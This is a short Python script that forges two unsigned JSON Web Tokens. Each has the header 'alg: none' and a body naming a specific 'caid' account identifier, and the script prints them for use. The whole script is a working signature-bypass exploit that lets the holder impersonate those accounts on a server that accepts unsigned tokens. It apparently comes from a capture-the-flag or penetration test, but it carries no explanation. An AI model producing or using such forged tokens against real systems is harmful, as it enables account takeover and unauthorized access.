import base64

first_user_header = '{"typ": "JWT", "alg": "none"}'
first_user_body = '{"caid": "CAIDE95D7E1A29E5480994E0B5BFDBB37148","exp": 1619545918}'

header_encoded = base64.b64encode(bytes(first_user_header, 'utf-8')).decode('ascii').strip('=')
body_encoded = base64.b64encode(bytes(first_user_body, 'utf-8')).decode('ascii').strip('=')

print("First user token:")
print(header_encoded, ".", body_encoded, ".", sep='')

second_user_header = '{"typ": "JWT", "alg": "none"}'
second_user_body = '{"caid": "CAID10C2CFEE7104459981B3A6C353516FAF","exp": 1619545918}'

second_user_header_encoded = base64.b64encode(bytes(second_user_header, 'utf-8')).decode('ascii').strip('=')
second_user_body_encoded = base64.b64encode(bytes(second_user_body, 'utf-8')).decode('ascii').strip('=')

print("Second user token:")
print(second_user_header_encoded, ".", second_user_body_encoded, ".", sep='')
